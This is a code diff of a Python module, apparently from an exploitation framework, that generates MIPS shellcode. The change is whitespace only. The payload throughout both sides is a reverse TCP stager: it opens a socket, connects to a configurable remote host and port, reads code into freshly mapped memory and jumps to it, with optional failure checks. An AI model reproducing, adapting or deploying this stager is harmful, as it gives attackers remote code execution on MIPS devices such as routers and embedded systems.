@@ -31,115 +31,115 @@ class PawnModule(Module, Assembler):
 
     def run(self):
         payload = dedent(f"""\
-            start:
-                li      $t7, -6
-                nor     $t7, $t7, $zero
-                addi    $a0, $t7, -3
-                addi    $a1, $t7, -3
-                slti    $a2, $zero, -1
-                li $v0, 4183
-                syscall 0x40404
+        start:
+            li      $t7, -6
+            nor     $t7, $t7, $zero
+            addi    $a0, $t7, -3
+            addi    $a1, $t7, -3
+            slti    $a2, $zero, -1
+            li $v0, 4183
+            syscall 0x40404
         """)
 
         if self.reliable.value:
             payload += dedent("""\
-                    slt $s0, $zero, $a3
-                    bne $s0, $zero, fail
+                slt $s0, $zero, $a3
+                bne $s0, $zero, fail
             """)
 
         payload += dedent(f"""\
-                sw      $v0, -4($sp)
+            sw      $v0, -4($sp)
 
-                lw      $a0, -4($sp)
-                li      $t7, -3
-                nor     $t7, $t7, $zero
-                sw      $t7, -32($sp)
-                lui     $t6, 0x{self.port.big.hex()}
-                sw      $t6, -28($sp)
-                lui     $t6, {self.host.big[:2].hex()}
-                ori     $t6, $t6, {self.host.big[2:].hex()}
-                sw      $t6, -26($sp)
-                addiu   $a1, $sp, -30
-                li      $t4, -17
-                nor     $a2, $t4, $zero
-                li      $v0, 4170
-                syscall 0x40404
+            lw      $a0, -4($sp)
+            li      $t7, -3
+            nor     $t7, $t7, $zero
+            sw      $t7, -32($sp)
+            lui     $t6, 0x{self.port.big.hex()}
+            sw      $t6, -28($sp)
+            lui     $t6, {self.host.big[:2].hex()}
+            ori     $t6, $t6, {self.host.big[2:].hex()}
+            sw      $t6, -26($sp)
+            addiu   $a1, $sp, -30
+            li      $t4, -17
+            nor     $a2, $t4, $zero
+            li      $v0, 4170
+            syscall 0x40404
         """)
 
         if self.reliable.value:
             payload += dedent("""\
-                    slt $s0, $zero, $a3
-                    bne $s0, $zero, fail
+                slt $s0, $zero, $a3
+                bne $s0, $zero, fail
             """)
 
         payload += dedent(f"""\
-                li      $a0, -1
-                li      $a1, {str(self.length.value+1)}
-                addi    $a1, $a1, -1
-                li      $t1, -8
-                nor     $t1, $t1, $0
-                add     $a2, $t1, $0
-                li      $a3, 2050
-                li      $t3, -22
-                nor     $t3, $t3, $zero
-                add     $t3, $sp, $t3
-                sw      $0, -1($t3)
-                sw      $2, -5($t3)
-                li      $v0, 4090
-                syscall 0x40404
+            li      $a0, -1
+            li      $a1, {str(self.length.value+1)}
+            addi    $a1, $a1, -1
+            li      $t1, -8
+            nor     $t1, $t1, $0
+            add     $a2, $t1, $0
+            li      $a3, 2050
+            li      $t3, -22
+            nor     $t3, $t3, $zero
+            add     $t3, $sp, $t3
+            sw      $0, -1($t3)
+            sw      $2, -5($t3)
+            li      $v0, 4090
+            syscall 0x40404
         """)
 
         if self.reliable.value:
             payload += dedent("""\
-                    slt $a0, $zero, $a3
-                    bne $s0, $zero, fail
+                slt $a0, $zero, $a3
+                bne $s0, $zero, fail
             """)
 
         payload += dedent(f"""\
-                sw      $v0, -8($sp)
+            sw      $v0, -8($sp)
 
-                lw      $a0, -4($sp)
-                lw      $a1, -8($sp)
-                li      $a2, 4097
-                addi    $a2, $a2, -1
-                li      $v0, 4003
-                syscall 0x40404
+            lw      $a0, -4($sp)
+            lw      $a1, -8($sp)
+            li      $a2, 4097
+            addi    $a2, $a2, -1
+            li      $v0, 4003
+            syscall 0x40404
         """)
 
         if self.reliable.value:
             payload += dedent("""\
-                    slt $a0, $zero, $a3
-                    bne $s0, $zero, fail
+                slt $a0, $zero, $a3
+                bne $s0, $zero, fail
             """)
 
         payload += dedent("""\
-                lw      $a0, -8($sp)
-                add     $a1, $v0, $zero
-                li      $t1, -3
-                nor     $t1, $t1, $0
-                add     $a2, $t1, $0
-                li      $v0, 4147
-                syscall 0x40404
+            lw      $a0, -8($sp)
+            add     $a1, $v0, $zero
+            li      $t1, -3
+            nor     $t1, $t1, $0
+            add     $a2, $t1, $0
+            li      $v0, 4147
+            syscall 0x40404
         """)
 
         if self.reliable.value:
             payload += dedent("""\
-                    slt $s0, $zero, $a3
-                    bne $s0, $zero, fail
+                slt $s0, $zero, $a3
+                bne $s0, $zero, fail
             """)
 
         payload += dedent("""\
-                lw   $s1, -8($sp)
-                lw   $s2, -4($sp)
-                jalr $s1
+            lw   $s1, -8($sp)
+            lw   $s2, -4($sp)
+            jalr $s1
         """)
 
         if self.reliable.value:
             payload += dedent("""\
-                fail:
-                    li      $a0, $zero
-                    li      $v0, 4001
-                    syscall 0x40404
+            fail:
+                li      $a0, $zero
+                li      $v0, 4001
+                syscall 0x40404
             """)
 
         return self.assemble(
